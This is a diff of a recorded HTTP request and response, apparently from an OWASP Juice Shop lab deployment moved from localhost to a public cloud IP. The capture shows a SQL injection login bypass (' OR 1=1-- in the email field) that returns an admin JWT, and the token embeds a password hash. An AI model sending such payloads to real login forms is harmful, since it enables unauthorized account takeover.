@@ -1,34 +1,24 @@
 {
   "request": {
     "method": "POST",
-    "url": "http://localhost:3000/rest/user/login",
+    "url": "http://34.56.167.155/rest/user/login",
     "headers": {
-      "sec-ch-ua-platform": "\"Linux\"",
-      "referer": "http://localhost:3000/",
-      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36",
-      "accept": "application/json, text/plain, */*",
-      "sec-ch-ua": "\"Chromium\";v=\"141\", \"Not?A_Brand\";v=\"8\"",
-      "content-type": "application/json",
-      "sec-ch-ua-mobile": "?0"
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
+      "Connection": "keep-alive",
+      "Content-Type": "application/json",
+      "Cookie": "language=en; welcomebanner_status=dismiss; continueCode=YjWMVeP3kgjaY2WX69ERDNmpn78Gl5c220VqO5xovBrbyZK1Jzw4LMlQbrNw",
+      "Origin": "http://34.56.167.155",
+      "Referer": "http://34.56.167.155/",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
     },
-    "postData": "{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}"
+    "postData": "{\"email\":\"' OR 1=1--\",\"password\":\"1234\"}"
   },
   "response": {
     "status": 200,
-    "headers": {
-      "etag": "W/\"310-j5OlMv0kcBLt05sXmWHEJys3Xn4\"",
-      "connection": "keep-alive",
-      "x-content-type-options": "nosniff",
-      "x-recruiting": "/#/jobs",
-      "access-control-allow-origin": "*",
-      "content-length": "784",
-      "keep-alive": "timeout=5",
-      "date": "Sat, 17 Oct 2026 03:42:15 GMT",
-      "content-type": "application/json; charset=utf-8",
-      "feature-policy": "payment 'self'",
-      "vary": "Accept-Encoding",
-      "x-frame-options": "SAMEORIGIN"
-    },
-    "body": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0xNyAwMzo0MTowNy4zNDEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0xNyAwMzo0MTowNy4zNDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTIyMDg1MzZ9.GjrQLYdJy0JnId_sE7xf3Ju7f36r7oGMJszkc5KoUlwXjWpNC4sDLqjN6cyLwkhE423cO3O1Tevrd7ZE7Y5U0eA9I9w3RdGu9zljwDubi614u45OpLMfhF-qcih7n6n-M8TIEa1hj1YHg-gn-5zUyBx08JSxxzpTaLk4QHL2wGc\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
-  }
+    "statusText": "OK",
+    "remoteAddress": "34.56.167.155:80",
+    "body": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMS0wMiAyMjoyMzozNi4yNjUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMS0wMiAyMjoyMzozNi4yNjUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTM2NTkyNTV9.U3LVov0U9dSBetjopoNZ4DvHDOlNT99oeafPECxGrO552klqgdqWdzA-IgDA7_WtJHXmWaDBY3dsMwtaxen03-QIS9oYSc9tdYReVGK7jtGmEF53HwxsXxZ8RP9mj8cxucTD6ZCH4T8ArrAaRXvG71_BTpWGMc3weVH8cSFoh84\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+  },
+  "note": "Capturado manualmente desde Chrome DevTools contra el despliegue real en GCP Compute Engine (34.56.167.155), no contra localhost."
 }
